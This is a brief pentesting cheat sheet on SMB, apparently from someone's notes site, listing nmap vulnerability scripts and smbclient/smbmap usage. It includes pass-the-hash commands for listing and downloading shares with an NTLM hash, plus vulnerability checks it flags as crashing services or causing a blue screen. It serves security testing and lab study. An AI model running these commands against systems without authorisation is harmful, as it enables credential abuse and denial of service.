---
layout: default
title: SMB
tags:
    - 139
    - 445
    - block
    - message
    - samba
    - server
    - smbclient
    - smbd
    - smbmap
---
# SMB
### Nmap scripts
Safe vulnerability scan
```shell
nmap -p 445 -vv --script smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-vuln-cve-2017-7494 10.10.10.10
```

Windows 2000 regsvc null pointer crash (_**service crashes if successful**_)
```shell
nmap -p 445 -vv --script smb-vuln-regsvc-dos 10.10.10.10
```

CVE-2009-3103 DOS check (Windows Vista and some of 7 - _**BSOD if successful**_)
```shell
nmap -p 445 -vv --script smb-vuln-cve2009-3103 10.10.10.10
```

CVE-2010-2550 memory corruption check (_**BSOD if successful**_)
```shell
nmap -p 445 -vv --script smb-vuln-ms10-054 10.10.10.10
```

### Pass-the-hash
List directories
```shell
smbclient -U <user>%<hash> --pw-nt-hash -L 10.10.10.10
```
```shell
smbmap -u <user> -p '<NTLM hash>:<LM hash>' -H 10.10.10.10
```
- _LM hash is legacy and can usually be anything_
- `--download <path>`: download file
- `-R`: recursively list files

Open specific directory

```shell
smbclient -U <user>%<hash> --pw-nt-hash //10.10.10.10/<directory>
```

### Regular usage
Mount
```shell
mount -t cifs -o username=<username> //10.10.10.10/ /mnt/smb/
```

SMBMap
```shell
smbmap -H 10.10.10.10
```

```shell
smbmap -H 10.10.10.10 -u <username> 
```
- Sometimes adding anything to the `-u` field will return results